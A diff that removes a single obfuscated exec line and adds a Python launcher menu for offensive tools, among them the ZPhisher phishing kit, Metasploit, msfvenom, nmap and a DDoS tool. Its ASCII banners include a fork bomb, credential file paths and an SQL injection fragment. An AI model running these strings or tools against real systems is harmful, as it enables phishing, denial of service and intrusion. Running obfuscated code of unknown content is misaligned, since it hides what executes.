@@ -1,2 +1,915 @@
-# Python obfuscation by pyobfuscator.com
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
+import subprocess
+import os
+import sys
+import time
+import random
+
+os.system('clear')
+
+
+
+Banner = random.randint(1, 8)
+
+
+RED = '\033[31m'
+GREEN = '\033[32m'
+CYAN = '\033[36m'
+ORANGE = '\033[38;2;255;165;0m'
+
+if Banner == 1:
+
+    print('')
+    print('')
+    print('')
+    print('\033[35m██████╗  ██╗   ██╗    ██╗  ██╗ █████╗  ██████╗██╗  ██╗')
+    print('███╔══██╗██║   ██║    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝')
+    print('███║  ██║██║   ██║    ███████║███████║██║     █████╔╝ ')
+    print('███║  ██║╚██╗ ██╔╝    ██╔══██║██╔══██║██║     ██╔═██╗ ')
+    print('███████╔╝ ╚████╔╝     ██║  ██║██║  ██║╚██████╗██║  ██╗')
+    print('╚══════╝   ╚═══╝      ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    Multitool V1\033[0m')
+    print('')                                            
+    print('')
+    print('')
+
+elif Banner == 2:
+    print('')
+    print('')
+    print('')
+    print('')
+    print("\033[36m") 
+
+    print('                                           `:oDFo:`          ')
+    print('                                       ./ymM0dayMmy/.                       ')
+    print('                                    -+dHJ5aGFyZGVyIQ==+-                    ')
+    print('                                `:sm⏣~~Destroy.No.Data~~s:`                   ')
+    print('                             -+h2~~Maintain.No.Persistence~~h+-                ')
+    print('                         `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`              ')
+    print('                     ./etc/shadow.0days-Data,%20OR%201=1--.No.0MN8./.           ')
+    print('                   -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-        ')
+    print('                  -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-        ')
+    print('                  :dopeAW.No<nano>o                     :is:TЯiKC.sudo-.A:        ')
+    print('                  :were.all.alike,`                     :The.PFYroy.No.D7:         ')
+    print('                  :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:         ')
+    print('                  :msf>exploit -j.                       :Ns.BOB&ALICEes7:         ')
+    print('                  :---srwxrwx:-.`                        `MS146.52.No.Per:         ')
+    print('                  :<script>.Ac816/                        sENbove3101.404:         ')
+    print('                  :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:         ')
+    print('                  :09.14.2011.raid                       /STFU|wall.No.Pr:       ')
+    print('                  :hevnsntSurb025N.                      dNVRGOING2GIVUUP:       ')
+    print('                  :#OUTHOUSE-  -s:                       /corykennedyData:       ')
+    print('                  :$nmap -oS                              SSo.6178306Ence:      ')
+    print('                  :Awsm.da:                            /shMTl#beats3o.No.:       ')
+    print('                  :Ring0:                             `dDestRoyREXKC3ta/M:        ')
+    print('                  :23d:                               sSETEC.ASTRONOMYist:          ')
+    print('                   /-                        /yo-    .ence.N:(){ :|: & };:      ')
+    print('                                             `:Shall.We.Play.A.Game?tron/        ')
+    print('                                             ```-ooy.if1ghtf0r+ehUser5`          ')
+    print('                                           ..th3.H1V3.U2VjRFNN.jMh+.`            ')
+    print('                                          `MjM~~WE.ARE.se~~MMjMs                ')
+    print('                                          +~KANSAS.CITYs~-_`                    ')
+    print('                                            J~HAKCERS~./.`                      ')
+    print('                                            .esc:wq!:`                          ')
+    print('                                             +++ATH`                           \033[0m')
+    print('')
+    print('')
+    print('')
+    print('                                     \033[38;2;255;165;0mThanks For Using DVHACK')
+    print('')
+    print("\033[0m")
+
+
+if Banner == 3:
+
+    print('\033[31m')                                                                                                  
+    print('')                                                                                                   
+    print('')                                                                                                   
+    print('')                                                                                                                                                                                                                                                                                           
+    print('                       .........                           ..........              ')                  
+    print('               .........:----:..........            .........:----:.........            ')                 
+    print('             ....=****************:....           ....-****************-...             ')                
+    print('             ..+**********************-....      ...=**********************=...           ')               
+    print('          ..:***************************=.... ....+**************************+...         ')               
+    print('         ..+******************************-.. ..+******************************=.          ')              
+    print('        .:*********************************+...*#*******************************+...         ')            
+    print('     ...-************************************-#**###**##**************************:.         ')           
+    print('     ...**************************************####*********************************..         ')           
+    print('     ..**************************************######*##*****************************=.         ')           
+    print('     .-**************************************####***********************************...       ')           
+    print('     .=*****************+.           ..=********:  .+**************-  .+************:..       ')           
+    print('     .=*****************+   -+++++=:.    .***###*.  :*************+  .=*************:..         ')         
+    print('     .=*****************+   =*********=.   -*####=  .=************.  :**************:..           ')       
+    print('     .-*****************+   =***********:   :*###*:  .+**********=  .+**************...         ')         
+    print('     .:*****************+   =************:   +####+.  :*****#****  .=*************#*...         ')         
+    print('     ..+****************+   =*****#******+.  -##**#-  .+********.  :******#**###***:.           ')         
+    print('     ...****************+   =************+.  :##*###:   *#*****=  .+********#*#***+.             ')        
+    print('     ...-#**************+   =*************.  :###*#*+.  -******.  =*************##:..            ')        
+    print('        .=**************+   =************+.  -#####**-  .+*#**:  :**#****#***#**#:..             ')        
+    print('        ..+*************+   =***##*****#*-.  =##*##***:  .*##+. .+**************-..              ')        
+    print('        ...=************+   =***********+.  .*########+.  -**. .=#******#**#*#*-.               ')         
+    print('          ..=***********+   =**********-.  :*#####*###*-  .+-  :**##*****##**#:..             ')           
+    print('          ...:**********+   =******+=..  .=**##########*:  .. .+##*****#*****..                ')          
+    print('             ..+********+             .:+****########**#+    .=*#*##**#****-...               ')          
+    print('             ...:********+------==+****##****##########*#*:::=*########***.....               ')           
+    print('               ...-***********#*******#******###****###***####*###*##***....                 ')            
+    print('                  ..-************************########**####***####****:...                  ')             
+    print('                  ....=******##**************############***********-.....                 ')              
+    print('                    ....=********************##########**###*#****-....                ')                  
+    print('                       ...=******************##########*#**##***-....           ')                         
+    print('                          ..=****************###############**:...           ')                            
+    print('                          ....-**************#####*####*****:....       ')                                 
+    print('                            ....:******##****#########****...        ')                                    
+    print('                               ....***#******#########*+...       ')                                       
+    print('                               ......=*******#####*#*-....        ')                                       
+    print('                                    ...-*****####**:....          ')                                       
+    print('                                       ..:***###+:...            ')                                        
+    print('                                         ..:+*=...            ')                                           
+    print('                                         ......... \033[0m')  
+    print('')
+    print('                                 \033[38;2;255;165;0mThanks For Using DVHACK')
+    print('')
+    print('')                                               
+
+if Banner == 4:
+    print('\033[36m\033[36m    __________')
+    print('   <  DVHack  >')
+    print('    ‾‾‾‾‾‾‾‾‾‾')
+    print('         \   ,__,')
+    print('          \  (oo)_____')
+    print('             (__)     )\ ')
+    print('                ||--||  *\033[0m')                                                                                                
+    print('                                    \033[38;2;255;165;0mThanks For Using DVHACK')                                                                                                
+    print('')                                                                                                
+    print('\033[0m')                                                                                                
+                                                                                                                                                                                                                                                                                                       
+if Banner == 5:
+    print('\033[36m                          MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM')
+    print('\033[36m                          MMMMMMMMMMM                MMMMMMMMMM')
+    print('\033[36m                          MMMN$                           vMMMM')
+    print('\033[36m                          MMMNl\033[0m      DDDDDDDDDDDDDD       \033[36mJMMMM\033[0m')
+    print('\033[36m                          MMMNl\033[0m      DDDDDDDDDDDDDDDD     \033[36mJMMMM\033[0m')
+    print('\033[36m                          MMMNl\033[0m      DDD          DDDD    \033[36mJMMMM\033[0m')
+    print('\033[36m                          MMMNI\033[0m      DDD           DDD    \033[36mjMMMM\033[0m')
+    print('\033[36m                          MMMNI\033[0m      DDD            DD    \033[36mjMMMM\033[0m')
+    print('\033[36m                          MMMNI\033[0m      DDD            DD    \033[36mjMMMM\033[0m')
+    print('\033[36m                          MMMNI\033[0m      DDD            DD    \033[36mjMMMM\033[0m')
+    print('\033[36m                          MMMNI\033[0m      DDD            DD    \033[36mjMMMM\033[0m')
+    print('\033[36m                          MMMNI\033[0m      DDD           DDD    \033[36mJMMMM\033[0m')
+    print('\033[36m                          MMMMR\033[0m      DDD          DDDD   \033[36m.dMMMM\033[0m')
+    print('\033[36m                          MMMMNm\033[0m     DDDDDDDDDDDDDDDD    \033[36mdMMMMM\033[0m')
+    print('\033[36m                          MMMMMMN \033[0m   DDDDDDDDDDDDDD     \033[36mNMMMMMN\033[0m')
+    print('\033[36m                          MMMMMMMMNe                 JMMMMMNMMM\033[0m')
+    print('\033[36m                          MMMMMMMMMMNm,            eMMMMMNMMNMM\033[0m')
+    print('\033[36m                          MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM\033[0m')
+    print('\033[36m                          MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM\033[0m')
+    print('')
+    print('')
+    print('                                    \033[38;2;255;165;0mThanks For Using DVHACK')
+    print('')
+    print('')
+    print('') 
+
+
+if Banner == 6:
+    print('                      ########                  #')
+    print('                  #################            #')
+    print('               ######################         #')
+    print('              #########################      #')
+    print('            ############################')
+    print('           ##############################')
+    print('           ###############################')
+    print('          ###############################')
+    print('          ##############################')
+    print('                          #    ########   #')
+    print('             \033[31m##        ###\033[0m        ####   ##')
+    print('                                  ###   ###')
+    print('                                ####   ###')
+    print('           ####          ##########   ####')
+    print('           #######################   ####')
+    print('            ####################   ####')
+    print('              ##################  ####')
+    print('                ############      ##')
+    print('                   ########        ###')
+    print('                  #########        #####')
+    print('                ############      ######')
+    print('               ########      #########')
+    print('                 #####       ########')
+    print('                   ###       #########')
+    print('                  ######    ############')
+    print('                 #######################')
+    print('                 #   #   ###  #   #   ##')
+    print('                 ########################')
+    print('                  ##     ##   ##     ##')
+    print('')
+    print('')
+    print(' \033[38;2;255;165;0m                Thanks For Using DVHACK\033[0m')
+    print('')
+    print('')
+    print('')
+
+END = '\033[0m'
+
+if Banner == 7:
+    print(RED + r'''
+        IIIIII    dTb.dTb        _.---._
+          II     4'  v  'B   .'"".'/|\`.""'.
+          II     6.     .P  :  .' / | \ `.  :
+          II     'T;. .;P'  '.'  /  |  \  `.'
+          II      'T; ;P'    `. /   |   \ .'
+        IIIIII     'YvP'       `-.__|__.-'
+
+                I love shell --me 
+          
+          ''' + END)
+    
+    
+
+    print('')
+    print('')
+
+
+if Banner == 8:
+    print(RED + r'''
+          
+
+            ╚══════════╦═══════════════════════════o══════════════════════════════╦══════════╝
+                   ╦═══╩═══════════════════════MultiTool══════════════════════════╩═══╦
+          
+
+
+                                ·▄▄▄▄   ▌ ▐·     ▄ .▄ ▄▄▄·  ▄▄· ▄ •▄              
+                                ██▪ ██ ▪█·█▌    ██▪▐█▐█ ▀█ ▐█ ▌▪█▌▄▌▪
+                                █·  ▐█▌▐█▐█•    ██▀▐█▄█▀▀█ ██ ▄▄▐▀▀▄·
+                                ██. ██  ███     ██▌▐▀▐█ ▪▐▌▐███▌▐█.█▌
+                                ▀▀▀▀▀• . ▀      ▀▀▀ · ▀  ▀ ·▀▀▀ ·▀  ▀
+          
+                                                        -By DaddyV
+          
+                   ╩═══╦═══════════════════════════o═══════════════════════════════╦═══╩
+            ╔══════════╩═══════════════════════════════════════════════════════════╩══════════╗
+          
+          
+          
+          
+          '''  + END)
+
+
+
+
+                                                                                                                                                                                      
+
+                                                                                                                
+
+print(RED + '========================')
+print('\033[38;2;255;165;0m    DVHACK V2 By DaddyV\033[0m')
+print('\033[31m========================')
+print('-----------<3-----------\033[0m')
+print('')
+print('\033[38;2;255;165;0m[01] \033[36mZPhisher\033[0m')
+print('\033[38;2;255;165;0m[02] \033[36mMetasploit Console\033[0m')
+print('\033[38;2;255;165;0m[03] \033[36mMSFVenom\033[0m')
+print('\033[38;2;255;165;0m[04] \033[36mNikto\033[0m')
+print('\033[38;2;255;165;0m[05] \033[36mNmap\033[0m')
+print('\033[38;2;255;165;0m[06] \033[36mWireshark\033[0m')
+print('\033[38;2;255;165;0m[07] \033[36mJohn The Ripper\033[0m     ')
+print('\033[38;2;255;165;0m[08] \033[36mSQLMap\033[0m')
+print('\033[38;2;255;165;0m[09] \033[36mNetcat\033[0m')
+print('\033[38;2;255;165;0m[10] \033[36mSEToolKit\033[0m')
+print('\033[38;2;255;165;0m[11] \033[36mDDoS Ripper\033[0m')
+print('\033[38;2;255;165;0m[12] \033[36mTHC Hydra\033[0m')
+print('\033[38;2;255;165;0m[13] \033[36mBurpSuite')
+print('\033[38;2;255;165;0m[14] \033[36mAircrack-ng\033[0m')
+print('')
+print('\033[38;2;255;165;0m[Exit] 99')
+print('\033[31m========================')
+print('')
+
+def enter_option():
+    print("\033[31m")
+    print("╭─[ OPTION ]")
+    print("╰──➤$ ", end="")
+    Option = input()
+    print("\033[0m")
+
+    return Option
+
+
+Option = enter_option()
+
+
+if Option == "01":
+    os.system('clear')
+    subprocess.run("cd ZPhisher/zphisher && bash zphisher.sh", shell=True)
+
+if Option == '02':
+    os.system('clear')
+    subprocess.run('msfconsole')
+
+
+if Option == '03':
+    os.system('clear')
+    print(CYAN + r'''
+                                                                                                        
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+               ...................                                                                  
+            ..:=+***************+=:...                                                              
+            -***********************..                                                              
+            -*=....=*********-....**..                                                              
+            -*=.  ...-*****-.    .**..                                                              
+            -*=.  .....=*-.  ... .**..   ...  ....                           ...     ...            
+            -*=. .-:.   ..  .-....**..  .%@....@%       .:.                  %..    ..*..*.         
+            -*=. .-**-.   .=**....**..  .#:+..*-%..%+#=.%*+.+*+@.=#+#..#*+%..%..#**%..%.*%+:.       
+            -*=. .-***=. .****....**..  .#.#:==-%.%%%%%.#:..+##@..*%=..+..:% %.+=..:+.%.:#.         
+            -*=. .-***=. .****....**..  .# .%*.-%.=+:.:.+=.=#.:@.:..=:.@:.*-.%.:#:.%:.%.:%...       
+            -*+. .-***=. .****....**..   ..... ..  ....  ............ .+...  .. ....... .....       
+            :**. .-***********...-**..                               ..:.                           
+            .:**..-***********..-**..            ..==........................:...                   
+             ..+*+=***********:**=..             .:-:-:..-.-.=..-.--.==::::+.-=..                   
+              ...=*************=..               .:..:..--::.:..--::-.:.--.=.:.:.                   
+                 ..-*********-..                  ... ........   ...... ........                    
+                  ...:+****:.                                                                       
+                    ....-...                                                                        
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    ''' + END)
+    time.sleep(1)
+    subprocess.run('msfvenom')
+
+
+if Option == '04':
+    os.system('clear')
+    time.sleep(0.2)
+    print(CYAN + r'''                                          ................                                          
+                                          ................                                          
+                                          ................                                          
+                               ... ... ......::::::::::..............                               
+                            ...........::------------------::...........                            
+                            .......:---------------------------::.......                            
+                            ....:----------------------------------:....                            
+                            ..----------------------------------------...... .                      
+                     ......:--------------------------------------------:......                     
+                     .....--=------------------------------------------=--.....                     
+                     ...:-==--------------------------------------------==-:...                     
+              .........-===----------------------------------------------===-........               
+              .......:-===------------------------------------------------===-:.......              
+              ......:====--------------------------------------------------====:......              
+              .....:=====--------------------------------------------------=====:.....              
+              ....:=====----------------------------------------------------=====:....              
+              ....-=====----------------------------------------------------=====-....              
+              ...:=+====----------------------------------------------------======:...              
+             ....-=======-------------------------------------------------=======+=..               
+             ...:++=======-----------------------------------------------=======++=:..              
+             ...:+++========-------------------------------------------=========+++:..              
+             ...-+++==========----------------------------------------==========+++-..              
+             ...-++++===========-------------------------------------===========+++=..              
+             ...=++++=============---------------------------------=============+++=..              
+              ..-+++++=============------------------------------===============+++-..              
+              ..-++++================--------------------------===============+++++-..              
+             ...:++++++==================-------------------==================+++++:..              
+             ....+++++=+====================================================+++++++:..              
+              ...+++++==%@@%%%%#+==================================+#%%%@@@%=++++++..               
+              ...-+++++=+%%@@@@@@%%#+==========================+#%%@@@@@@@%+==++++-...              
+              ...:*++++==#@@@@@@@@@@%%#======================#%%@@@@@@@@@@#==+++++:...              
+             .....=++++==+#@@@@@@@@@@@%%#==================#%%@@@@@@@@@@%#+==++++=....              
+             .....-+++++==+#%@@@@@@@@@@@%%*==============*%%@@@@@@@@@@@%#+==+++++-....              
+              .....=+++++===*%@@@@@@@@@@@@%*============*%@@@@@@@@@@@%%*===+++++=....               
+              .....:++++++===+#%%@@@@@@@@@@%*==========*%@@@@@@@@@@%%#+====+++++:.....              
+             .......-++++++=====*#%%%%@@@@@@%+========+%@@@@@@@%%%#*=====++++++=.....               
+             ........=+++++++======+***#######========########**+=======+++++++.......              
+              ........+++++++++==============*====+=+=*==============+++++++++.......               
+              .........+*++++++++++===========++++++++===========++++++++++++.........              
+                  ......=*++++++++++++++++++++++++++++++++++++++++++++++++*+....... .               
+                    .....=*++++++++++++++++++++++++++++++++++++++++++++++*=....                     
+                     .....-*++++++++++++++++++++++++++++++++++++++++++++*=.....                     
+                     ......:+*++++++++++++++++++++++++++++++++++++++++**:.....                      
+                        .....=*++++++++++++++++++++++++++++++++++++++*=......                       
+                            ...**++++++++++++++++++++++++++++++++++*+...                            
+                            ....:**++++++++++++++++++++++++++++++**:....                            
+                            ......:**++++++++++++++++++++++++++**-......                            
+                                   .:***++++++++***+++++++++*#*:.                                   
+                                   ....=***++*#*****##*++***=....                                   
+                                   ......:+*#############+:......                                   
+                                   .........:+#######*+:........                                    
+                                          ......-*+-......                                          
+                                          ...............                                           
+                                          ...............                                           
+                                            ...........                    
+
+
+                                           ''' + END)
+    time.sleep(1)
+    subprocess.run('nikto')
+
+
+if Option == '05':
+    os.system('clear')
+    print(CYAN + r'''
+                                                                                                        
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                   ..     . ...... .     ....                                       
+                                ..........::---=--===---::..........                                
+                         .........:----------:::::::::::--------:...........                        
+                       ......:-----:...........................:-----:......                        
+                 .........:-=--:....................................:----:.........                 
+                 ......--=-::.::.........:::::::::::::::::..........::.:--=--......                 
+             .......--=-::..::.:...::----==----===-===-======--::...-..:..-:-=--:......             
+          .......:---::...:.::::=---=--------===-=------------===-==:.::..:..::----.....            
+       .......:---:.:..:..:::----:----------======---::::---------::-=-:::..:..:::=--:........      
+       ....:----.-..::..::---::::----------==========--------------::::---:-..::..:.-=--:....       
+  .......:---:::..:..:----::::::----:------===+*#*****==-=-----:----::::::----:..:..:::-=-:......   
+  ....:--=::::.::.:----:::::::::---:::------=********#*+-------:::--::::::::::---:.::..:::=--:....  
+....:---:::..::.:---::::::::::::---:::------***+*++*****=-----::::--:.:::::::::::--:.:::.:::-=-:....
+..:--::::.:::::--::............:---::::-----++=++::++=++=----::::---:.............::--::::..::---:..
+.:---::.::::--::................::::::::----***+****+***----:::::::-.................:--::::.::---:.
+.---:::--------.................::::::::-----****++****=----::::::::.................-----=-::::---:
+:==---==-:-----..................::::::::-----=+****+=-----:::::::-.................:-----:-==---==-
+.:------=-=-===--:::.............::::::::::--------------::::::::::.............:---==-=-=--------:.
+...::-=====----::---=--::.........::::::::::::---------:::::::::::........:----=---::--=-==+=--:....
+...........::-====---:---=--::.....::-::::::::::-::-::::::::::-::.....::--=---:---==+-:::.......... 
+   ..............::===---::----=-::..::-::::::::::::::::::::-::..:---=---::--===-::..............   
+                .....:-===--:--:--=---:::----:::-:--::::---:------=-::-:-====:.....                 
+                 ........:-===---::::--------------------------::::---==--:........                 
+                       .....:-====::::::::----------------:::::::-===--:....                        
+                        ........-====--:::::::::::::::::::::--=====:.......                         
+                            .......:-========---====---========:......                              
+                                ..........:::-=======---::...........                               
+                                     ........................                                       
+                                             ...........                                            
+                                                                                                    
+                                                                                     
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                            
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    '''  + END)
+    time.sleep(1)
+    subprocess.run(['nmap', '-h'])
+
+
+if Option == '06':
+    os.system('clear')
+    print(CYAN + r'''
+                                                                                                ...   ..
+                                                                           .........................
+                                                                     ........:--===+++++*******+=:..
+                                                                .....:--==+++********************+..
+                                                          ......:--=+++++*************************:.
+                                                      .....:-====++++****************************-..
+                                                   ....:-=====+++*******************************-...
+                                                ....-======+++*********************************-..  
+                                             ....==+====+++***********************************-..   
+                                          ....-++=====+++************************************-...   
+                                         ..:+++====+++**************************************=..     
+                                     ....=+++====+++***************************************+..      
+                                   ....=*++====+++********************************########*:..      
+                                  ..:=*++====++**************************************#####-..       
+                                ...=*++====++**********************#*****################+..        
+                             ....=**+====++*****************####**#######################-..        
+                           ....-**++===++****************###############################+:..        
+                          ...:+*++====++*************###*###############################-..         
+                         ...=**+=====++************####################################*:..         
+                        ..:+**+====++***********##*####################################+...         
+                       ..-**++====++***********##*####################################*=..          
+                    ....+**+=====++*******##*#########################################*:.           
+                    ..-***+====++*********############################################+..           
+                  ...-***+====++********#*############################################+..           
+                 ...=**++===+++*******#*##############################################=..           
+                 ..=**++===+++******##################################################=..           
+               ...=**++===+++*******##################################################-..           
+              ...+**++==+++*******####################################################-..           
+             ...+**++==+++********####################################################-..           
+            ...+**++==+++******##*####################################################-..           
+           ...=**++==+++*******#######################################################-..           
+          ...=**++==+++*******########################################################=..           
+          ..-***+===++*******#########################################################=..           
+         ..:+**+===++******###################################################%%%%%%%#+..           
+         .:+**++==+++*****#################################################%%%%%%%%%%%*..           
+        ..=**++==+++*****############################################%##%##%%%%%%%%%%%*:.           
+       ..-***+==+++*****###########################################%%%#%%%%%%%%%%%%%%%#-..          
+      ...***++=+++******#########################################%%%#%%%%%%%%%%%%%%%%%%+..          
+      ..+**++=++++******########################################%%%%%%%%%%%%%%%%%%%%%%%*:..         
+     ..-***++++++******#######################################%%%#%%%%%%%%%%%%%%%%%%%%%#-..         
+    ...+**++++++*****#######################################%%%#%%%%%%%%%%%%%%%%%%%%%%%%=..         
+    ..=**++++++*******######################################%#%%%%%%%%%%%%%%%%%%%%%%%***+:.         
+   ..:+**++++++******#######################################%%%%%%%%%%%%%%%%%%%%#+*##%%%%-..        
